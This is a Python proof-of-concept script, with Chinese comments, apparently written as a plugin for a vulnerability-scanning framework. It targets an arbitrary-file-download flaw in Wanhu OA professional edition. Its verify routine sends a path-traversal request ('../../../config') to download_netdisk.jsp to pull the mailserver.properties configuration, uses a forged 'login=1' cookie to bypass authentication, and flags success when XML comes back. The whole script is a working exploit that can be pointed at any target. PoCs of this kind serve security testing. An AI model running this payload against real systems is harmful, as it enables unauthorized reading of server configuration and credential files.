from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin   

POC_NAME = "wanhuoa_file_download"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class wanhuoa_file_download(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0055',    # PoC的VID编号
            'vbid': '',
            'Name': 'wanhuoa_file_download',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-11-16',    # PoC创建时间
            },

        'vul': {
            'Product': '万户网络技术有限公司专业版OA系统',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': '任意文件下载',    # 漏洞类型
            'Severity': 'medium',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                万户OA专业版是集协同软件、门户网站、ERP、CRM、HR、财务、电子邮件、视频会议的功能的一种综合性办公系统。 该产品存在任意文件下载漏洞。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2016-11-29',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        url1 = urljoin(target,"/defaultroot/netdisk/download_netdisk.jsp?path=mailserver.properties&fileName=../../../config&fileExtName=xml&fileSaveName=x")

        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "cookie":"login=1",
        }

        location = ""
        print("[+] requesting vuln url1: ", url1)
        resp = req(url1, 'get', headers=header, allow_redirects=False)
        if resp is not None:
            location = resp.text
        if resp.status_code == 200 and "<?xml" in location:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url1    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = location
            if verbose:
                highlight("[+] url: " + url1 + " 存在万户网络技术有限公司专业版OA系统任意文件下载！！！")
        else:
            if verbose:
                highlight("[+] url: " + url1 + " 不存在万户网络技术有限公司专业版OA系统任意文件下载！！！")

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)